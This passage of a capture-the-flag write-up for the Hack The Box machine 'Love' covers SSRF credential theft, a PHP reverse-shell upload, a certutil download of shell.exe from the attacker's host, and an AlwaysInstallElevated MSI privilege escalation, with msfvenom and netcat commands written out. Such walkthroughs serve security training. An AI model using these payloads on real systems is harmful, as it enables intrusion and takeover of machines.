+</span></span></span><span style="display:flex;"><span><span style="color:#6e7681"></span><span style="color:#7ee787">/devinmoore*          (Status: 403) [Size</span>:<span style="color:#6e7681"> </span><span style="color:#a5d6ff">302</span>]<span style="color:#6e7681">                                    
+</span></span></span><span style="display:flex;"><span><span style="color:#6e7681">
+</span></span></span><span style="display:flex;"><span><span style="color:#6e7681"></span><span style="color:#7ee787">/200109*              (Status: 403) [Size</span>:<span style="color:#6e7681"> </span><span style="color:#a5d6ff">302</span>]<span style="color:#6e7681">                                    
+</span></span></span><span style="display:flex;"><span><span style="color:#6e7681">
+</span></span></span><span style="display:flex;"><span><span style="color:#6e7681"></span><span style="color:#7ee787">/*sa_                 (Status: 403) [Size</span>:<span style="color:#6e7681"> </span><span style="color:#a5d6ff">302</span>]<span style="color:#6e7681">                                    
+</span></span></span><span style="display:flex;"><span><span style="color:#6e7681">
+</span></span></span><span style="display:flex;"><span><span style="color:#6e7681"></span><span style="color:#7ee787">/*dc_                 (Status: 403) [Size</span>:<span style="color:#6e7681"> </span><span style="color:#a5d6ff">302</span>]<span style="color:#6e7681">                                    
+</span></span></span><span style="display:flex;"><span><span style="color:#6e7681">
+</span></span></span><span style="display:flex;"><span><span style="color:#6e7681"></span><span style="color:#7ee787">/%D8                  (Status: 403) [Size</span>:<span style="color:#6e7681"> </span><span style="color:#a5d6ff">302</span>]<span style="color:#6e7681">                                    
+</span></span></span><span style="display:flex;"><span><span style="color:#6e7681">
+</span></span></span><span style="display:flex;"><span><span style="color:#6e7681"></span><span style="color:#7ee787">/%CE                  (Status: 403) [Size</span>:<span style="color:#6e7681"> </span><span style="color:#a5d6ff">302</span>]<span style="color:#6e7681">                                    
+</span></span></span><span style="display:flex;"><span><span style="color:#6e7681">
+</span></span></span><span style="display:flex;"><span><span style="color:#6e7681"></span><span style="color:#7ee787">/%CF                  (Status: 403) [Size</span>:<span style="color:#6e7681"> </span><span style="color:#a5d6ff">302</span>]<span style="color:#6e7681">                                    
+</span></span></span><span style="display:flex;"><span><span style="color:#6e7681">
+</span></span></span><span style="display:flex;"><span><span style="color:#6e7681"></span><span style="color:#7ee787">/%CD                  (Status: 403) [Size</span>:<span style="color:#6e7681"> </span><span style="color:#a5d6ff">302</span>]<span style="color:#6e7681">                                    
+</span></span></span><span style="display:flex;"><span><span style="color:#6e7681">
+</span></span></span><span style="display:flex;"><span><span style="color:#6e7681"></span><span style="color:#7ee787">/%CC                  (Status: 403) [Size</span>:<span style="color:#6e7681"> </span><span style="color:#a5d6ff">302</span>]<span style="color:#6e7681">                                    
+</span></span></span><span style="display:flex;"><span><span style="color:#6e7681">
+</span></span></span><span style="display:flex;"><span><span style="color:#6e7681"></span><span style="color:#7ee787">/%CA                  (Status: 403) [Size</span>:<span style="color:#6e7681"> </span><span style="color:#a5d6ff">302</span>]<span style="color:#6e7681">                                    
+</span></span></span><span style="display:flex;"><span><span style="color:#6e7681">
+</span></span></span><span style="display:flex;"><span><span style="color:#6e7681"></span><span style="color:#7ee787">/%CB                  (Status: 403) [Size</span>:<span style="color:#6e7681"> </span><span style="color:#a5d6ff">302</span>]<span style="color:#6e7681">                                    
+</span></span></span><span style="display:flex;"><span><span style="color:#6e7681">
+</span></span></span><span style="display:flex;"><span><span style="color:#6e7681"></span><span style="color:#7ee787">/%D6                  (Status: 403) [Size</span>:<span style="color:#6e7681"> </span><span style="color:#a5d6ff">302</span>]<span style="color:#6e7681">                                    
+</span></span></span><span style="display:flex;"><span><span style="color:#6e7681">
+</span></span></span><span style="display:flex;"><span><span style="color:#6e7681"></span><span style="color:#7ee787">/%D0                  (Status: 403) [Size</span>:<span style="color:#6e7681"> </span><span style="color:#a5d6ff">302</span>]<span style="color:#6e7681">                                    
+</span></span></span><span style="display:flex;"><span><span style="color:#6e7681">
+</span></span></span><span style="display:flex;"><span><span style="color:#6e7681"></span><span style="color:#7ee787">/%D1                  (Status: 403) [Size</span>:<span style="color:#6e7681"> </span><span style="color:#a5d6ff">302</span>]<span style="color:#6e7681">                                    
+</span></span></span><span style="display:flex;"><span><span style="color:#6e7681">
+</span></span></span><span style="display:flex;"><span><span style="color:#6e7681"></span><span style="color:#7ee787">/%D4                  (Status: 403) [Size</span>:<span style="color:#6e7681"> </span><span style="color:#a5d6ff">302</span>]<span style="color:#6e7681">                                    
+</span></span></span><span style="display:flex;"><span><span style="color:#6e7681">
+</span></span></span><span style="display:flex;"><span><span style="color:#6e7681"></span><span style="color:#7ee787">/%D3                  (Status: 403) [Size</span>:<span style="color:#6e7681"> </span><span style="color:#a5d6ff">302</span>]<span style="color:#6e7681">                                    
+</span></span></span><span style="display:flex;"><span><span style="color:#6e7681">
+</span></span></span><span style="display:flex;"><span><span style="color:#6e7681"></span><span style="color:#7ee787">/%D7                  (Status: 403) [Size</span>:<span style="color:#6e7681"> </span><span style="color:#a5d6ff">302</span>]<span style="color:#6e7681">                                    
+</span></span></span><span style="display:flex;"><span><span style="color:#6e7681">
+</span></span></span><span style="display:flex;"><span><span style="color:#6e7681"></span><span style="color:#7ee787">/%D5                  (Status: 403) [Size</span>:<span style="color:#6e7681"> </span><span style="color:#a5d6ff">302</span>]<span style="color:#6e7681">                                    
+</span></span></span><span style="display:flex;"><span><span style="color:#6e7681">
+</span></span></span><span style="display:flex;"><span><span style="color:#6e7681"></span><span style="color:#7ee787">/%D2                  (Status: 403) [Size</span>:<span style="color:#6e7681"> </span><span style="color:#a5d6ff">302</span>]<span style="color:#6e7681">                                    
+</span></span></span><span style="display:flex;"><span><span style="color:#6e7681">
+</span></span></span><span style="display:flex;"><span><span style="color:#6e7681"></span><span style="color:#7ee787">/%C9                  (Status: 403) [Size</span>:<span style="color:#6e7681"> </span><span style="color:#a5d6ff">302</span>]<span style="color:#6e7681">                                    
+</span></span></span><span style="display:flex;"><span><span style="color:#6e7681">
+</span></span></span><span style="display:flex;"><span><span style="color:#6e7681"></span><span style="color:#7ee787">/%C1                  (Status: 403) [Size</span>:<span style="color:#6e7681"> </span><span style="color:#a5d6ff">302</span>]<span style="color:#6e7681">                                    
+</span></span></span><span style="display:flex;"><span><span style="color:#6e7681">
+</span></span></span><span style="display:flex;"><span><span style="color:#6e7681"></span><span style="color:#7ee787">/%C8                  (Status: 403) [Size</span>:<span style="color:#6e7681"> </span><span style="color:#a5d6ff">302</span>]<span style="color:#6e7681">                                    
+</span></span></span><span style="display:flex;"><span><span style="color:#6e7681">
+</span></span></span><span style="display:flex;"><span><span style="color:#6e7681"></span><span style="color:#7ee787">/%C6                  (Status: 403) [Size</span>:<span style="color:#6e7681"> </span><span style="color:#a5d6ff">302</span>]<span style="color:#6e7681">                                    
+</span></span></span><span style="display:flex;"><span><span style="color:#6e7681">
+</span></span></span><span style="display:flex;"><span><span style="color:#6e7681"></span><span style="color:#7ee787">/%C3                  (Status: 403) [Size</span>:<span style="color:#6e7681"> </span><span style="color:#a5d6ff">302</span>]<span style="color:#6e7681">                                    
+</span></span></span><span style="display:flex;"><span><span style="color:#6e7681">
+</span></span></span><span style="display:flex;"><span><span style="color:#6e7681"></span><span style="color:#7ee787">/%C5                  (Status: 403) [Size</span>:<span style="color:#6e7681"> </span><span style="color:#a5d6ff">302</span>]<span style="color:#6e7681">                                    
+</span></span></span><span style="display:flex;"><span><span style="color:#6e7681">
+</span></span></span><span style="display:flex;"><span><span style="color:#6e7681"></span><span style="color:#7ee787">/%C7                  (Status: 403) [Size</span>:<span style="color:#6e7681"> </span><span style="color:#a5d6ff">302</span>]<span style="color:#6e7681">                                    
+</span></span></span><span style="display:flex;"><span><span style="color:#6e7681">
+</span></span></span><span style="display:flex;"><span><span style="color:#6e7681"></span><span style="color:#7ee787">/%C2                  (Status: 403) [Size</span>:<span style="color:#6e7681"> </span><span style="color:#a5d6ff">302</span>]<span style="color:#6e7681">                                    
+</span></span></span><span style="display:flex;"><span><span style="color:#6e7681">
+</span></span></span><span style="display:flex;"><span><span style="color:#6e7681"></span><span style="color:#7ee787">/%C4                  (Status: 403) [Size</span>:<span style="color:#6e7681"> </span><span style="color:#a5d6ff">302</span>]<span style="color:#6e7681">                                    
+</span></span></span><span style="display:flex;"><span><span style="color:#6e7681">
+</span></span></span><span style="display:flex;"><span><span style="color:#6e7681"></span><span style="color:#7ee787">/%D9                  (Status: 403) [Size</span>:<span style="color:#6e7681"> </span><span style="color:#a5d6ff">302</span>]<span style="color:#6e7681">                                    
+</span></span></span><span style="display:flex;"><span><span style="color:#6e7681">
+</span></span></span><span style="display:flex;"><span><span style="color:#6e7681"></span><span style="color:#7ee787">/%DD                  (Status: 403) [Size</span>:<span style="color:#6e7681"> </span><span style="color:#a5d6ff">302</span>]<span style="color:#6e7681">                                    
+</span></span></span><span style="display:flex;"><span><span style="color:#6e7681">
+</span></span></span><span style="display:flex;"><span><span style="color:#6e7681"></span><span style="color:#7ee787">/%DF                  (Status: 403) [Size</span>:<span style="color:#6e7681"> </span><span style="color:#a5d6ff">302</span>]<span style="color:#6e7681">                                    
+</span></span></span><span style="display:flex;"><span><span style="color:#6e7681">
+</span></span></span><span style="display:flex;"><span><span style="color:#6e7681"></span><span style="color:#7ee787">/%DE                  (Status: 403) [Size</span>:<span style="color:#6e7681"> </span><span style="color:#a5d6ff">302</span>]<span style="color:#6e7681">                                    
+</span></span></span><span style="display:flex;"><span><span style="color:#6e7681">
+</span></span></span><span style="display:flex;"><span><span style="color:#6e7681"></span><span style="color:#7ee787">/%DB                  (Status: 403) [Size</span>:<span style="color:#6e7681"> </span><span style="color:#a5d6ff">302</span>]<span style="color:#6e7681">                                    
+</span></span></span><span style="display:flex;"><span><span style="color:#6e7681">
+</span></span></span><span style="display:flex;"><span><span style="color:#6e7681"></span><span style="color:#7ee787">/login%3f             (Status: 403) [Size</span>:<span style="color:#6e7681"> </span><span style="color:#a5d6ff">302</span>]<span style="color:#6e7681">                                    
+</span></span></span><span style="display:flex;"><span><span style="color:#6e7681">
+</span></span></span><span style="display:flex;"><span><span style="color:#6e7681"></span><span style="color:#7ee787">/%22julie%20roehm%22  (Status: 403) [Size</span>:<span style="color:#6e7681"> </span><span style="color:#a5d6ff">302</span>]<span style="color:#6e7681">                                    
+</span></span></span><span style="display:flex;"><span><span style="color:#6e7681">
+</span></span></span><span style="display:flex;"><span><span style="color:#6e7681"></span><span style="color:#7ee787">/%22james%20kim%22    (Status: 403) [Size</span>:<span style="color:#6e7681"> </span><span style="color:#a5d6ff">302</span>]<span style="color:#6e7681">                                    
+</span></span></span><span style="display:flex;"><span><span style="color:#6e7681">
+</span></span></span><span style="display:flex;"><span><span style="color:#6e7681"></span><span style="color:#7ee787">/%22britney%20spears%22 (Status: 403) [Size</span>:<span style="color:#6e7681"> </span><span style="color:#a5d6ff">302</span>]<span style="color:#6e7681">                                  
+</span></span></span><span style="display:flex;"><span><span style="color:#6e7681"></span><span style="color:#a5d6ff">===============================================================</span><span style="color:#6e7681">
+</span></span></span><span style="display:flex;"><span><span style="color:#6e7681"></span><span style="color:#a5d6ff">2021</span><span style="color:#a5d6ff">/07/09 06:05:24 Finished</span><span style="color:#6e7681">
+</span></span></span><span style="display:flex;"><span><span style="color:#6e7681"></span><span style="color:#a5d6ff">===============================================================</span><span style="color:#6e7681">
+</span></span></span></code></pre></div><p>Most of the open ports and services identified in the scan led to nothing useful, however one particular thing stood out. A subdomain, <code>staging.love.htb</code>, was specifically listed in the SSL certificate on port 443. Given that visiting the normal site generates a 403 error both when using <code>https://10.10.10.239</code> and <code>https://love.htb</code>, I decided to add <code>staging.love.htb</code> to the <code>/etc/hosts</code> file and enumerate that. Worth noting that you have to visit the website on port 80 via HTTP, not 443 via HTTPS.</p>
+<p><img src="0.png" alt=""></p>
+<p>On the website there is a demo for the file scanning tool:</p>
+<p><img src="1.png" alt=""></p>
+<p>The first thing to check for a service like this is what kind of validation is being performed. I tested that by trying to read the Windows host file on the remote machine:</p>
+<p><img src="2.png" alt=""> <img src="3.png" alt=""></p>
+<p>Given that it works with local files and actually renders the file, I decided to try to use it as a proxy to bypass the 403 errors I got when trying to visit the sites on ports 443 and 5000:</p>
+<p><img src="4.png" alt=""></p>
+<p>While port 443 proved unfruitful, I was successfully able to perform an SSRF attack against port 5000:</p>
+<p><img src="5.png" alt=""> <img src="6.png" alt=""></p>
+<p>Those credentials allowed me to gain administrative access to the voting system admin panel at <code>10.10.10.239/admin/</code>:</p>
+<p><img src="7.png" alt=""> <img src="8.png" alt=""></p>
+<p>One thing that stood out on the admin panel is that it was possible to change the user&rsquo;s image. From the gobuster scan I knew there was an <code>/images/</code> folder. If inputs were not properly sanitized for the image upload I could potentially upload a reverse shell and execute it to get a shell. I uploaded a test file to see if that was the case:</p>
+<p><img src="9.png" alt=""> <img src="10.png" alt=""></p>
+<p>Success! Now to test if it&rsquo;s publicly viewable:</p>
+<p><img src="11.png" alt=""></p>
+<p>With that knowledge, I felt pretty comfortable that I could get a reverse shell. I used msfvenom to generate the payload, uploaded it, set up a netcat listener, and got a shell:</p>
+<div class="highlight"><pre tabindex="0" style="color:#e6edf3;background-color:#0d1117;-moz-tab-size:4;-o-tab-size:4;tab-size:4;"><code class="language-shell" data-lang="shell"><span style="display:flex;"><span>┌──<span style="color:#ff7b72;font-weight:bold">(</span>kali@kali<span style="color:#ff7b72;font-weight:bold">)</span>-<span style="color:#ff7b72;font-weight:bold">[</span>~/htb/love/blog<span style="color:#ff7b72;font-weight:bold">]</span>
+</span></span><span style="display:flex;"><span>└─$ msfvenom -p php/reverse_php <span style="color:#79c0ff">LHOST</span><span style="color:#ff7b72;font-weight:bold">=</span>10.10.14.6 <span style="color:#79c0ff">LPORT</span><span style="color:#ff7b72;font-weight:bold">=</span><span style="color:#a5d6ff">4444</span> -f raw &gt; reverse.php
+</span></span><span style="display:flex;"><span><span style="color:#ff7b72;font-weight:bold">[</span>-<span style="color:#ff7b72;font-weight:bold">]</span> No platform was selected, choosing Msf::Module::Platform::PHP from the payload
+</span></span><span style="display:flex;"><span><span style="color:#ff7b72;font-weight:bold">[</span>-<span style="color:#ff7b72;font-weight:bold">]</span> No arch selected, selecting arch: php from the payload
+</span></span><span style="display:flex;"><span>No encoder specified, outputting raw payload
+</span></span><span style="display:flex;"><span>Payload size: <span style="color:#a5d6ff">3038</span> bytes
+</span></span></code></pre></div><p><img src="12.png" alt=""></p>
+<div class="highlight"><pre tabindex="0" style="color:#e6edf3;background-color:#0d1117;-moz-tab-size:4;-o-tab-size:4;tab-size:4;"><code class="language-shell" data-lang="shell"><span style="display:flex;"><span>┌──<span style="color:#ff7b72;font-weight:bold">(</span>kali@kali<span style="color:#ff7b72;font-weight:bold">)</span>-<span style="color:#ff7b72;font-weight:bold">[</span>~/htb/love/blog<span style="color:#ff7b72;font-weight:bold">]</span>
+</span></span><span style="display:flex;"><span>└─$ sudo nc -nvlp <span style="color:#a5d6ff">4444</span> 
+</span></span><span style="display:flex;"><span><span style="color:#ff7b72;font-weight:bold">[</span>sudo<span style="color:#ff7b72;font-weight:bold">]</span> password <span style="color:#ff7b72">for</span> kali: 
+</span></span><span style="display:flex;"><span>listening on <span style="color:#ff7b72;font-weight:bold">[</span>any<span style="color:#ff7b72;font-weight:bold">]</span> <span style="color:#a5d6ff">4444</span> ...
+</span></span><span style="display:flex;"><span>connect to <span style="color:#ff7b72;font-weight:bold">[</span>10.10.14.6<span style="color:#ff7b72;font-weight:bold">]</span> from <span style="color:#ff7b72;font-weight:bold">(</span>UNKNOWN<span style="color:#ff7b72;font-weight:bold">)</span> <span style="color:#ff7b72;font-weight:bold">[</span>10.10.10.239<span style="color:#ff7b72;font-weight:bold">]</span> <span style="color:#a5d6ff">50988</span>
+</span></span><span style="display:flex;"><span>whoami
+</span></span><span style="display:flex;"><span>love<span style="color:#79c0ff">\p</span>hoebe
+</span></span></code></pre></div><h1 id="privilege-escalation">
+  Privilege Escalation
+  <a class="heading-link" href="#privilege-escalation">
+    <i class="fa-solid fa-link" aria-hidden="true" title="Link to heading"></i>
+    <span class="sr-only">Link to heading</span>
+  </a>
+</h1>
+<p>Now, even though I had a shell at this point, the shell was absolutely awful. Worst of all was that it disconnected every couple of minutes, making proper enumeration a real pain. To solve that I generated an x64 msfvenom payload, downloaded it to the box using certutil, and executed it to get a more stable shell.</p>
+<div class="highlight"><pre tabindex="0" style="color:#e6edf3;background-color:#0d1117;-moz-tab-size:4;-o-tab-size:4;tab-size:4;"><code class="language-shell" data-lang="shell"><span style="display:flex;"><span>┌──<span style="color:#ff7b72;font-weight:bold">(</span>kali@kali<span style="color:#ff7b72;font-weight:bold">)</span>-<span style="color:#ff7b72;font-weight:bold">[</span>~/htb/love/blog<span style="color:#ff7b72;font-weight:bold">]</span>
+</span></span><span style="display:flex;"><span>└─$ msfvenom -p windows/x64/shell_reverse_tcp <span style="color:#79c0ff">LHOST</span><span style="color:#ff7b72;font-weight:bold">=</span>10.10.14.6 <span style="color:#79c0ff">LPORT</span><span style="color:#ff7b72;font-weight:bold">=</span><span style="color:#a5d6ff">4445</span> -f exe &gt; shell.exe
+</span></span><span style="display:flex;"><span><span style="color:#ff7b72;font-weight:bold">[</span>-<span style="color:#ff7b72;font-weight:bold">]</span> No platform was selected, choosing Msf::Module::Platform::Windows from the payload
+</span></span><span style="display:flex;"><span><span style="color:#ff7b72;font-weight:bold">[</span>-<span style="color:#ff7b72;font-weight:bold">]</span> No arch selected, selecting arch: x64 from the payload
+</span></span><span style="display:flex;"><span>No encoder specified, outputting raw payload
+</span></span><span style="display:flex;"><span>Payload size: <span style="color:#a5d6ff">460</span> bytes
+</span></span><span style="display:flex;"><span>Final size of exe file: <span style="color:#a5d6ff">7168</span> bytes
+</span></span></code></pre></div><div class="highlight"><pre tabindex="0" style="color:#e6edf3;background-color:#0d1117;-moz-tab-size:4;-o-tab-size:4;tab-size:4;"><code class="language-shell" data-lang="shell"><span style="display:flex;"><span>┌──<span style="color:#ff7b72;font-weight:bold">(</span>kali@kali<span style="color:#ff7b72;font-weight:bold">)</span>-<span style="color:#ff7b72;font-weight:bold">[</span>~/htb/love/blog<span style="color:#ff7b72;font-weight:bold">]</span>
+</span></span><span style="display:flex;"><span>└─$ sudo nc -nvlp <span style="color:#a5d6ff">4444</span>                                                                      
+</span></span><span style="display:flex;"><span>listening on <span style="color:#ff7b72;font-weight:bold">[</span>any<span style="color:#ff7b72;font-weight:bold">]</span> <span style="color:#a5d6ff">4444</span> ...
+</span></span><span style="display:flex;"><span>connect to <span style="color:#ff7b72;font-weight:bold">[</span>10.10.14.6<span style="color:#ff7b72;font-weight:bold">]</span> from <span style="color:#ff7b72;font-weight:bold">(</span>UNKNOWN<span style="color:#ff7b72;font-weight:bold">)</span> <span style="color:#ff7b72;font-weight:bold">[</span>10.10.10.239<span style="color:#ff7b72;font-weight:bold">]</span> <span style="color:#a5d6ff">50989</span>
+</span></span><span style="display:flex;"><span>certutil.exe -urlcache -f http://10.10.14.6/shell.exe shell.exe
+</span></span><span style="display:flex;"><span>****  Online  ****
+</span></span><span style="display:flex;"><span>CertUtil: -URLCache command completed successfully.
+</span></span><span style="display:flex;"><span>dir
+</span></span><span style="display:flex;"><span>Volume in drive C has no label.
+</span></span><span style="display:flex;"><span>Volume Serial Number is 56DE-BA30
+</span></span><span style="display:flex;"><span>
+</span></span><span style="display:flex;"><span>Directory of C:<span style="color:#79c0ff">\x</span>ampp<span style="color:#79c0ff">\h</span>tdocs<span style="color:#79c0ff">\o</span>mrs<span style="color:#79c0ff">\i</span>mages
+</span></span><span style="display:flex;"><span>
+</span></span><span style="display:flex;"><span>08/07/2021  12:14 PM    &lt;DIR&gt;          .
+</span></span><span style="display:flex;"><span>08/07/2021  12:14 PM    &lt;DIR&gt;          ..
+</span></span><span style="display:flex;"><span>08/06/2021  07:48 PM           159,744 admin.msi
+</span></span><span style="display:flex;"><span>05/18/2018  08:10 AM             4,240 facebook-profile-image.jpeg
+</span></span><span style="display:flex;"><span>04/12/2021  03:53 PM                 <span style="color:#a5d6ff">0</span> index.html.txt
+</span></span><span style="display:flex;"><span>01/27/2021  12:08 AM               <span style="color:#a5d6ff">844</span> index.jpeg
+</span></span><span style="display:flex;"><span>08/06/2021  07:33 PM         1,919,488 privilege.exe
+</span></span><span style="display:flex;"><span>08/24/2017  04:00 AM            26,644 profile.jpg
+</span></span><span style="display:flex;"><span>08/07/2021  12:10 PM             3,038 reverse.php
+</span></span><span style="display:flex;"><span>08/06/2021  07:06 PM             7,168 reverse1.exe
+</span></span><span style="display:flex;"><span>08/07/2021  12:14 PM             7,168 shell.exe
+</span></span><span style="display:flex;"><span>08/07/2021  12:04 PM                <span style="color:#a5d6ff">32</span> test.php
+</span></span><span style="display:flex;"><span>             <span style="color:#a5d6ff">10</span> File<span style="color:#ff7b72;font-weight:bold">(</span>s<span style="color:#ff7b72;font-weight:bold">)</span>      2,128,366 bytes
+</span></span><span style="display:flex;"><span>              <span style="color:#a5d6ff">2</span> Dir<span style="color:#ff7b72;font-weight:bold">(</span>s<span style="color:#ff7b72;font-weight:bold">)</span>   3,880,849,408 bytes free
+</span></span><span style="display:flex;"><span>.<span style="color:#79c0ff">\s</span>hell.exe
+</span></span></code></pre></div><div class="highlight"><pre tabindex="0" style="color:#e6edf3;background-color:#0d1117;-moz-tab-size:4;-o-tab-size:4;tab-size:4;"><code class="language-shell" data-lang="shell"><span style="display:flex;"><span>┌──<span style="color:#ff7b72;font-weight:bold">(</span>kali@kali<span style="color:#ff7b72;font-weight:bold">)</span>-<span style="color:#ff7b72;font-weight:bold">[</span>~/htb/love/blog<span style="color:#ff7b72;font-weight:bold">]</span>
+</span></span><span style="display:flex;"><span>└─$ sudo python3 -m http.server <span style="color:#a5d6ff">80</span>
+</span></span><span style="display:flex;"><span><span style="color:#ff7b72;font-weight:bold">[</span>sudo<span style="color:#ff7b72;font-weight:bold">]</span> password <span style="color:#ff7b72">for</span> kali: 
+</span></span><span style="display:flex;"><span>Serving HTTP on 0.0.0.0 port <span style="color:#a5d6ff">80</span> <span style="color:#ff7b72;font-weight:bold">(</span>http://0.0.0.0:80/<span style="color:#ff7b72;font-weight:bold">)</span> ...
+</span></span><span style="display:flex;"><span>10.10.10.239 - - <span style="color:#ff7b72;font-weight:bold">[</span>07/Aug/2021 14:48:07<span style="color:#ff7b72;font-weight:bold">]</span> <span style="color:#a5d6ff">&#34;GET /shell.exe HTTP/1.1&#34;</span> <span style="color:#a5d6ff">200</span> -
+</span></span><span style="display:flex;"><span>10.10.10.239 - - <span style="color:#ff7b72;font-weight:bold">[</span>07/Aug/2021 14:48:07<span style="color:#ff7b72;font-weight:bold">]</span> <span style="color:#a5d6ff">&#34;GET /shell.exe HTTP/1.1&#34;</span> <span style="color:#a5d6ff">200</span> -
+</span></span></code></pre></div><div class="highlight"><pre tabindex="0" style="color:#e6edf3;background-color:#0d1117;-moz-tab-size:4;-o-tab-size:4;tab-size:4;"><code class="language-shell" data-lang="shell"><span style="display:flex;"><span>┌──<span style="color:#ff7b72;font-weight:bold">(</span>kali@kali<span style="color:#ff7b72;font-weight:bold">)</span>-<span style="color:#ff7b72;font-weight:bold">[</span>~/htb/love/blog<span style="color:#ff7b72;font-weight:bold">]</span>
+</span></span><span style="display:flex;"><span>└─$ sudo nc -nvlp <span style="color:#a5d6ff">4445</span> 
+</span></span><span style="display:flex;"><span><span style="color:#ff7b72;font-weight:bold">[</span>sudo<span style="color:#ff7b72;font-weight:bold">]</span> password <span style="color:#ff7b72">for</span> kali: 
+</span></span><span style="display:flex;"><span>listening on <span style="color:#ff7b72;font-weight:bold">[</span>any<span style="color:#ff7b72;font-weight:bold">]</span> <span style="color:#a5d6ff">4445</span> ...
+</span></span><span style="display:flex;"><span>connect to <span style="color:#ff7b72;font-weight:bold">[</span>10.10.14.6<span style="color:#ff7b72;font-weight:bold">]</span> from <span style="color:#ff7b72;font-weight:bold">(</span>UNKNOWN<span style="color:#ff7b72;font-weight:bold">)</span> <span style="color:#ff7b72;font-weight:bold">[</span>10.10.10.239<span style="color:#ff7b72;font-weight:bold">]</span> <span style="color:#a5d6ff">50992</span>
+</span></span><span style="display:flex;"><span>Microsoft Windows <span style="color:#ff7b72;font-weight:bold">[</span>Version 10.0.19042.867<span style="color:#ff7b72;font-weight:bold">]</span>
+</span></span><span style="display:flex;"><span><span style="color:#ff7b72;font-weight:bold">(</span>c<span style="color:#ff7b72;font-weight:bold">)</span> <span style="color:#a5d6ff">2020</span> Microsoft Corporation. All rights reserved.
+</span></span><span style="display:flex;"><span> 
+</span></span><span style="display:flex;"><span>C:<span style="color:#79c0ff">\x</span>ampp<span style="color:#79c0ff">\h</span>tdocs<span style="color:#79c0ff">\o</span>mrs<span style="color:#79c0ff">\i</span>mages&gt;whoami
+</span></span><span style="display:flex;"><span>whoami   
+</span></span><span style="display:flex;"><span>love<span style="color:#79c0ff">\p</span>hoebe 
+</span></span><span style="display:flex;"><span>
+</span></span><span style="display:flex;"><span>C:<span style="color:#79c0ff">\x</span>ampp<span style="color:#79c0ff">\h</span>tdocs<span style="color:#79c0ff">\o</span>mrs<span style="color:#79c0ff">\i</span>mages&gt;
+</span></span></code></pre></div><p>From there, I was able to grab the user flag, download winPEAS from my machine, and run it. Within its output I found my path to root - the <code>AlwaysInstallElevated</code> privilege. This allows any user, regardless of what privileges they normally have, to install software as an administrator. This is a dangerous configuration, as the <code>.msi</code> files used to install programs can also provide commands to run during installation, which in this case would be run as a system-level user.</p>
+<p><img src="13.png" alt=""></p>
+<p>To generate the malicious payload I once again utilized msfvenom. Uploading it was, again, as simple as running certutil. I then proceeded to run the <code>.msi</code> and wait for my not-so-hard-earned shell:</p>
+<div class="highlight"><pre tabindex="0" style="color:#e6edf3;background-color:#0d1117;-moz-tab-size:4;-o-tab-size:4;tab-size:4;"><code class="language-shell" data-lang="shell"><span style="display:flex;"><span>┌──<span style="color:#ff7b72;font-weight:bold">(</span>kali@kali<span style="color:#ff7b72;font-weight:bold">)</span>-<span style="color:#ff7b72;font-weight:bold">[</span>~/htb/love/blog<span style="color:#ff7b72;font-weight:bold">]</span>
+</span></span><span style="display:flex;"><span>└─$ msfvenom --platform windows --arch x64 --payload windows/x64/shell_reverse_tcp <span style="color:#79c0ff">LHOST</span><span style="color:#ff7b72;font-weight:bold">=</span>10.10.14.6 <span style="color:#79c0ff">LPORT</span><span style="color:#ff7b72;font-weight:bold">=</span><span style="color:#a5d6ff">4446</span> --encoder x64/xor --iterations <span style="color:#a5d6ff">9</span> --format msi --out system.msi
+</span></span><span style="display:flex;"><span>Found <span style="color:#a5d6ff">1</span> compatible encoders
+</span></span><span style="display:flex;"><span>Attempting to encode payload with <span style="color:#a5d6ff">9</span> iterations of x64/xor
+</span></span><span style="display:flex;"><span>x64/xor succeeded with size <span style="color:#a5d6ff">503</span> <span style="color:#ff7b72;font-weight:bold">(</span><span style="color:#79c0ff">iteration</span><span style="color:#ff7b72;font-weight:bold">=</span>0<span style="color:#ff7b72;font-weight:bold">)</span>
+</span></span><span style="display:flex;"><span>x64/xor succeeded with size <span style="color:#a5d6ff">543</span> <span style="color:#ff7b72;font-weight:bold">(</span><span style="color:#79c0ff">iteration</span><span style="color:#ff7b72;font-weight:bold">=</span>1<span style="color:#ff7b72;font-weight:bold">)</span>
+</span></span><span style="display:flex;"><span>x64/xor succeeded with size <span style="color:#a5d6ff">583</span> <span style="color:#ff7b72;font-weight:bold">(</span><span style="color:#79c0ff">iteration</span><span style="color:#ff7b72;font-weight:bold">=</span>2<span style="color:#ff7b72;font-weight:bold">)</span>
+</span></span><span style="display:flex;"><span>x64/xor succeeded with size <span style="color:#a5d6ff">623</span> <span style="color:#ff7b72;font-weight:bold">(</span><span style="color:#79c0ff">iteration</span><span style="color:#ff7b72;font-weight:bold">=</span>3<span style="color:#ff7b72;font-weight:bold">)</span>
+</span></span><span style="display:flex;"><span>x64/xor succeeded with size <span style="color:#a5d6ff">663</span> <span style="color:#ff7b72;font-weight:bold">(</span><span style="color:#79c0ff">iteration</span><span style="color:#ff7b72;font-weight:bold">=</span>4<span style="color:#ff7b72;font-weight:bold">)</span>
+</span></span><span style="display:flex;"><span>x64/xor succeeded with size <span style="color:#a5d6ff">703</span> <span style="color:#ff7b72;font-weight:bold">(</span><span style="color:#79c0ff">iteration</span><span style="color:#ff7b72;font-weight:bold">=</span>5<span style="color:#ff7b72;font-weight:bold">)</span>
+</span></span><span style="display:flex;"><span>x64/xor succeeded with size <span style="color:#a5d6ff">743</span> <span style="color:#ff7b72;font-weight:bold">(</span><span style="color:#79c0ff">iteration</span><span style="color:#ff7b72;font-weight:bold">=</span>6<span style="color:#ff7b72;font-weight:bold">)</span>
+</span></span><span style="display:flex;"><span>x64/xor succeeded with size <span style="color:#a5d6ff">783</span> <span style="color:#ff7b72;font-weight:bold">(</span><span style="color:#79c0ff">iteration</span><span style="color:#ff7b72;font-weight:bold">=</span>7<span style="color:#ff7b72;font-weight:bold">)</span>
+</span></span><span style="display:flex;"><span>x64/xor succeeded with size <span style="color:#a5d6ff">823</span> <span style="color:#ff7b72;font-weight:bold">(</span><span style="color:#79c0ff">iteration</span><span style="color:#ff7b72;font-weight:bold">=</span>8<span style="color:#ff7b72;font-weight:bold">)</span>
+</span></span><span style="display:flex;"><span>x64/xor chosen with final size <span style="color:#a5d6ff">823</span>
+</span></span><span style="display:flex;"><span>Payload size: <span style="color:#a5d6ff">823</span> bytes
+</span></span><span style="display:flex;"><span>Final size of msi file: <span style="color:#a5d6ff">159744</span> bytes
+</span></span><span style="display:flex;"><span>Saved as: system.msi
